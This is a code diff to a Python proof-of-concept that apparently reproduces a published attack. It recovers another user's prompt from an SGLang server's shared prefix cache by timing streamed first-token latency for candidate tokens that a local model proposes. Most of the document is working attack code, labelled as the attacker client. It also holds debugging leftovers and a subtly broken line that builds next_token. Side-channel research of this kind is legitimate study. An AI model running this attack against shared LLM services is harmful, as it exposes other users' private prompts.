@@ -9,6 +9,9 @@ import torch
 from datasets import load_dataset
 from itertools import islice
 
+import aiohttp, json, time
+
+import requests
 def chunk_list(data, chunk_size):
     it = iter(data)
     while True:
@@ -17,13 +20,77 @@ def chunk_list(data, chunk_size):
             break
         yield chunk
 # --- Configuration Constants ---
+
+async def stream_ttft(
+    session: aiohttp.ClientSession,
+    url: str,
+    payload: dict,
+):
+    start = time.perf_counter()
+
+    async with session.post(url, json=payload) as resp:
+        if resp.status != 200:
+            return {
+                "status": f"HTTP_{resp.status}",
+                "ttft": None,
+                "token": None,
+            }
+
+        async for raw in resp.content:
+            line = raw.decode("utf-8", errors="ignore").strip()
+            if not line:
+                continue
+
+            # Handle SSE
+            if line.startswith("data:"):
+                line = line[5:].strip()
+
+            if line == "[DONE]":
+                break
+
+            token = ""
+
+            # Try JSON first
+            try:
+                obj = json.loads(line)
+
+                # Most common SGLang / vLLM format
+                if "text" in obj:
+                    token = obj["text"]
+
+                # OpenAI-style delta format (just in case)
+                elif "choices" in obj:
+                    delta = obj["choices"][0].get("delta", {})
+                    token = delta.get("content", "")
+
+            except json.JSONDecodeError:
+                # Fallback: treat raw line as token
+                token = line
+
+            if token:
+                ttft = time.perf_counter() - start
+                return {
+                    "status": "OK",
+                    "ttft": ttft,
+                    "token": token,
+                }
+
+    return {
+        "status": "NO_TOKEN",
+        "ttft": None,
+        "token": None,
+    }
 # NOTE: This URL is used for context only; the actual network calls are mocked.
 SGLANG_SERVICE_URL = "http://localhost:30000/generate"
-LOCAL_MODEL_PATH = "mistralai/Mistral-7B-v0.1"
+# LOCAL_MODEL_PATH = "Qwen/Qwen2.5-1.5B-Instruct"
+HF_TOKEN = ""
+LOCAL_MODEL_PATH="chaejin98330/Qwen2.5-0.5B-Finetuned"
 DATASET_NAME = "fka/awesome-chatgpt-prompts"
 
-tokenizer = AutoTokenizer.from_pretrained(LOCAL_MODEL_PATH)
-model = AutoModelForCausalLM.from_pretrained(LOCAL_MODEL_PATH)
+tokenizer = AutoTokenizer.from_pretrained(LOCAL_MODEL_PATH,
+    token=HF_TOKEN)
+model = AutoModelForCausalLM.from_pretrained(LOCAL_MODEL_PATH,
+    token=HF_TOKEN)
 # ====================================================================
 # MOCK DEPENDENCIES (For Simulation)
 # ====================================================================
@@ -66,6 +133,10 @@ class KV_Simulator:
             max_match_len = max(max_match_len, match_len)
             
         return max_match_len
+def flush_cache():
+    flushurl = f"http://localhost:30000/flush_cache"
+    response=requests.post(flushurl)
+    return
 
 # ====================================================================
 # INFERENCE CLIENT (The Attacker)
@@ -125,7 +196,7 @@ class InferenceClient:
                 outputs = model(input_ids)
                 next_token_logits = outputs.logits[:, -1, :]
                 # Get top 'num_candidates' tokens
-                top_k_indices = torch.topk(next_token_logits, model.config.vocab_size).indices.squeeze(0)
+                top_k_indices = torch.topk(next_token_logits, num_candidates).indices.squeeze(0)
             
             candidates = [tokenizer.decode(idx.item()) for idx in top_k_indices]
           
@@ -170,7 +241,7 @@ class InferenceClient:
         """
         
         all_token_metrics = []
-
+        
         # 3. Run parallel requests to find the maximum LPM hit
         async with aiohttp.ClientSession() as session:
             tasks = [self._send_token_peek_request_victim(session, seq, track_kv) for seq in input_sequences]
@@ -185,7 +256,7 @@ class InferenceClient:
         """
         
         payload = {
-            "model": "Qwen/Qwen3-0.6B-FP8",
+            "model": "Qwen/Qwen2.5-1.5B-Instruct",
             "text": full_sequence, #[{"role": "user", "content": full_sequence}],
             "max_new_tokens": 1,
             "stream": True # Essential for per-token access
@@ -370,7 +441,7 @@ class InferenceClient:
 
 
     # --- Main Attack Function: Iterative Token Recovery ---
-    async def recover_victim_request_iterative(self, known_prefix: str, max_tokens_to_recover: int, num_candidates: int = 10, track_kv: bool = False) -> Tuple[str, Dict]:
+    async def recover_victim_request_iterative(self, known_prefix: str, max_tokens_to_recover: int, num_candidates: int = 10, track_kv: bool = False, next_token = "") -> Tuple[str, Dict]:
         """
         Iteratively recovers the victim's request one token at a time
         using the LPM side-channel[cite: 1905].
@@ -384,8 +455,9 @@ class InferenceClient:
         for i in range(max_tokens_to_recover):
         
             # 1. Generate single-token candidates from local LLM
-            candidate_tokens = self.predict_next_token_local_llm(current_prefix=recovered_request, num_candidates=10)
-           
+     
+            candidate_tokens = self.predict_next_token_local_llm(current_prefix=recovered_request, num_candidates=num_candidates)
+            print("candidate tokens are ", candidate_tokens)
             # 2. Create the full sequence for peeking
             
             # peek_sequences = [recovered_request + token for token in candidate_tokens]
@@ -396,30 +468,83 @@ class InferenceClient:
             #     results = await asyncio.gather(*tasks)
 
             peek_sequences = [recovered_request + token for token in candidate_tokens]
+            # print("Peak sequences are ", peek_sequences)
             results = []
-            CONCURRENCY = 50
-            async with aiohttp.ClientSession() as session:
+            CONCURRENCY = 90
+            NUM_CYCLES = 1
+            for request_cycle in range(NUM_CYCLES):
+                # async with aiohttp.ClientSession() as session:
+                #     for seq_batch in chunk_list(peek_sequences, CONCURRENCY):
+                #         tasks = [self._send_token_peek_request(session, seq, track_kv) 
+                #                 for seq in seq_batch]
+                #         batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+                #         results.append(batch_results)
 
-                for seq_batch in chunk_list(peek_sequences, CONCURRENCY):
-                    tasks = [self._send_token_peek_request(session, seq, track_kv) 
-                            for seq in seq_batch]
+       
+                async with aiohttp.ClientSession() as session:
+                    # for seq_batch in chunk_list(peek_sequences, CONCURRENCY)
+                        for seq in peek_sequences:
+                            payload = {"model": "Qwen/Qwen3-0.6B-FP8", "text": seq, "max_new_tokens": 1, "stream": True}
+                            out = await stream_ttft(session, SGLANG_SERVICE_URL, payload)
+                            results.append(out)
+                            # exit()
+                            
+            averaged_results = []
 
-                    batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            for token_index, result in enumerate(results):
+                
+                averaged_results.append({
+                    "token_index": token_index,
+                    "token": candidate_tokens[token_index],
+                    "latency": result["ttft"],
+                    # "num_samples": len(latencies),
+                    "status":"OK"
+                })
+            # NUM_CYCLES = len(results)
+            # NUM_TOKENS = len(results[0])     # number of candidate tokens
 
-                    results.extend(batch_results)
-            # 4. Analyze Results and Select Best Candidate
+            # # initialize output
+            # for token_index in range(NUM_TOKENS):
+            #     latencies = []
+            #     for cycle in range(NUM_CYCLES):
+            #         r = results[cycle][token_index]
+            #         if isinstance(r, dict) and "latency" in r:
+            #             latencies.append(r["latency"])
+
+            #     # compute average for this token
+            #     if latencies:
+            #         avg_latency = sum(latencies) / len(latencies)
+            #     else:
+            #         avg_latency = None
+
+            #     # build final combined result for this token
+            #     averaged_results.append({
+            #         "token_index": token_index,
+            #         "token": candidate_tokens[token_index],
+            #         "latency": avg_latency,
+            #         "num_samples": len(latencies),
+            #         "status":"OK"
+            #     })
+
+            # print("Final averaged results:")
+            # for x in averaged_results:
+            #     print(x)
+           
+                        # 4. Analyze Results and Select Best Candidate
             best_candidate_data: Dict[str, Any] = {'latency': float('inf'), 'candidate': None}
             
             # The logic prioritizes the highest LPM score (strongest cache hit),
             # then the lowest latency (fastest response time).
             print(f"Processing the recovered token for {recovered_request}")
-            for result in results:
+         
+            for result in averaged_results:
                 try: 
-                    print(f"Current request is {result['recovered_token']} latency {result['latency']}")
+                    print(f"Current request is {candidate_tokens[result['token_index']]} latency {result['latency']}")
                     
                     if result['status'] != 'OK':
                         continue
                     is_better = False
+                  
                     # Primary Criterion: Higher LPM score is always better
                     # if result['lpm_score'] > best_candidate_data['lpm_score']:
                     #     is_better = True
@@ -428,11 +553,16 @@ class InferenceClient:
                     # elif result['lpm_score'] == best_candidate_data['lpm_score']:
                     if result['latency'] < best_candidate_data['latency']:
                         is_better = True
+
+
                     if is_better:
-                        best_candidate_data["candidate"] = result["recovered_token"]
+                        best_candidate_data["candidate"] = candidate_tokens[result['token_index']] #result["recovered_token"]
                         best_candidate_data["latency"] = result["latency"]
+
                 except Exception as e:
-                    print(f"Exception {e} occurred for {result}")
+                    import traceback 
+                    traceback.print_exc()
+                    print(f"Exception {e} occurred for {result} {best_candidate_data['candidate']}")
             
             # 5. Extract and Append the recovered token
             if best_candidate_data['candidate'] is not None:
@@ -445,10 +575,11 @@ class InferenceClient:
                 all_token_metrics.append({
                     'step': i + 1,
                     'recovered_token': recovered_token,
-                    'latency': best_candidate_data['latency']
+                    'latency': best_candidate_data['latency'], 
+                  
                 })
                 print(f"Step {i+1}: Recovered token: '{recovered_token.strip()}' | Current Request: '{recovered_request}'")
-                
+                exit()
             else:
                 print(f"Step {i+1}: Failed to find a valid continuation. Ending recovery.")
                 break
@@ -482,7 +613,8 @@ async def main():
         # The victim's full request is stored in the cache (LPM tree)[cite: 1895, 1982].
         print(f"--- VICTIM CACHE INJECTION ---")
         # client.kv_simulator.add_to_cache(victim_request)
-        
+        # flush_cache()
+        # for i in range(20):
         # Recover up to 10 additional tokens
         recovered_request = await client.victim_simulation(
             input_sequences=victim_request, 
@@ -493,7 +625,7 @@ async def main():
 
 
         print(f"Victim's full request added to cache: '{victim_request}'")
-        print(f"Victim's response request added to cache: '{recovered_request[0]}'")
+        # print(f"Victim's response request added to cache: '{recovered_request[0][:30]}'")
         print(f"Cache size: {len(client.kv_simulator.cache)} entries.\n")
 
         # --- 2. ATTACKER PROMPT RECOVERY ---
@@ -502,15 +634,19 @@ async def main():
 
         words_to_recover = len(victim_request.split())
         print(f"--- ATTACKER PROMPT RECOVERY AGAINST SGLANG ({SGLANG_SERVICE_URL}), max tokens to recover {words_to_recover} ---")
-        known_prefix = victim_request.split(".")[0]+"."
+        known_prefix = " ".join(victim_request.split(".")[0].split()[:3])
+        next_token = " ".join(victim_request.split(".")[0].split()[4])
        
         # Recover up to 10 additional tokens
         recovered_request, metrics = await client.recover_victim_request_iterative(
             known_prefix=known_prefix, 
             max_tokens_to_recover=words_to_recover, 
             num_candidates=10, 
-            track_kv=True # Enable the LPM side-channel logic
+            track_kv=True,  # Enable the LPM side-channel logic, 
+            next_token = next_token
         )
+        print(recovered_request)
+        exit()
         
         print("\n--- Summary of Attack Outcome ---")
         print(f"Victim Request (Target): '{victim_request}'")
